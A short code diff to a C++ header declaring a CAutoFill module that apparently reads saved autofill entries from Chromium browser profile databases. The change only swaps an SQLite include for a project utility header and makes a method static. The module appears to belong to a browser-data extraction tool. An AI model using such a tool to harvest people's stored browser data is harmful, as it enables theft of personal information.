@@ -7,13 +7,13 @@
 
 
 #include "../ChromiumBrowserModule.h"
-#include "sqlite3.h"
+#include "../../../../../utils/SQLiteUtil.h"
 
 class CAutoFill : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
 private:
-    std::list<AutoFill> getAutoFill(const fs::path &db_path);
+    static std::list<AutoFill> getAutoFill(const fs::path &db_path);
 };
 
 
